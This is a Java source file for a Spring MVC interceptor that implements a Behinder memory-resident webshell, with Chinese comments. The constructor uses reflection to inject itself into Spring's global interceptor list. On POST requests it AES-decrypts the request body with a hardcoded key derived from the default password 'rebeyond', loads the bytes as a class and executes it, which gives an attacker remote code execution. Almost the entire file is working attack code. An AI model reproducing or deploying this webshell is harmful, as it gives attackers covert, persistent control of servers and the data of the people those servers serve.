import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.lang.reflect.Method;

public class BehinderAddInterceptor extends HandlerInterceptorAdapter {
    private final String k="e45e329feb5d925b"; /* 该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond */
    public BehinderAddInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException {
        // 获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 从context中获取AbstractHandlerMapping的实例对象
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        // 反射获取adaptedInterceptors属性
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        // 避免重复添加
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                System.out.println("已经添加过TestInterceptor实例了");
                return;
            }
        }
        BehinderAddInterceptor aaa = new BehinderAddInterceptor("aaa");  // 避免进入实例创建的死循环
        adaptedInterceptors.add(aaa);  //  添加全局interceptor
    }

    private BehinderAddInterceptor(String aaa){}

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        HttpSession session = request.getSession();

        // 冰蝎逻辑
        //create pageContext
        HashMap pageContext = new HashMap();
        pageContext.put("request",request);
        pageContext.put("response",response);
        pageContext.put("session",session);
        // Behinder MemShell
        if (request.getMethod().equals("POST")) {
            String k = "e45e329feb5d925b";  /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            session.putValue("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            //revision Behinder
            Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            method.setAccessible(true);
            byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
            evilclass.newInstance().equals(pageContext);
        }

        return true;
    }
}